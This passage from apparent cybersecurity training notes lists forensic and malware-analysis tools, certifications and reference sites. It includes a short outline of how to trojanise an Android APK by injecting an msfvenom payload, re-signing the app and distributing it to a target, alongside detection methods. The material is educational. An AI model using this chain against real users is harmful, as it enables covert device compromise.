- Vulnerability assessment
- Threat intelligence

### 📱 APK Manipulation

**Tools:**
* **msfvenom** – Payload generation
* **jarsigner** – APK signing

**Attack Chain:**
1. Decompile legitimate APK (apktool)
2. Inject malicious payload (msfvenom)
3. Recompile APK
4. Sign with certificate (jarsigner)
5. Distribute to target

**Forensic Detection:**
- Certificate verification
- Code integrity checks
- Behavioral analysis

### 🧰 Specialized Toolkits

**REMnux:**
- Best malware analysis Linux distribution
- Pre-loaded with analysis tools
- Document analysis, memory forensics, network analysis
- 🔗 [REMnux.org](https://remnux.org/)

**Included Tools:**
- Volatility, Wireshark, YARA
- oledump, pdf-parser, pdfid
- Network simulators
- Debugging tools

---

## 📚 Additional Resources

### 🎓 Training & Certifications

**DFIR Focus:**
* 🎓 [SANS DFIR](https://www.sans.org/cyber-aces/)
* 🎓 GCFE (GIAC Certified Forensic Examiner)
* 🎓 GCFA (GIAC Certified Forensic Analyst)

**SOC Operations:**
* 🎓 GCIH (GIAC Certified Incident Handler)
* 🎓 CySA+ (CompTIA Cybersecurity Analyst)

**VAPT:**
* 🎓 OSCP (Offensive Security Certified Professional)
* 🎓 CEH (Certified Ethical Hacker)
* 🎓 eWPT (eLearnSecurity Web Penetration Tester)

### 📖 Knowledge Bases

* 🗂️ [MITRE ATT&CK](https://attack.mitre.org/)
* 🛡️ [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
* 🏛️ [CISA](https://www.cisa.gov/)
* 🔓 [Hacking Articles](https://www.hackingarticles.in/)
* 🛠️ [REMnux](https://remnux.org/)
* 📱 [XDA Forums](https://www.xda-developers.com/)

### 🎯 VAPT Resources

**OWASP Top 10:**
- Web application security risks
- Essential for VAPT professionals
- Updated regularly
- 🔗 [OWASP Top 10](https://owasp.org/www-project-top-ten/)

**Network Engineering Basics:**
- All network protocols (TCP/IP, DNS, DHCP, etc.)
- Firewall configuration
- Rule creation and management
- ACL (Access Control Lists)

---

## ⚠️ Disclaimer

**For educational use only.** Unauthorized use of these techniques and tools may violate laws. Always obtain proper authorization before conducting security assessments or forensic investigations.

**📜 License:** MIT License

---

**🎓 Continuous Learning:**
- Stay updated with latest CVEs
- Practice in legal lab environments
- Join security communities
- Contribute to open-source tools
- Maintain ethical standards

---

*Last Updated: Based on training notes compilation*
*Maintained by: Cybersecurity Research Community*
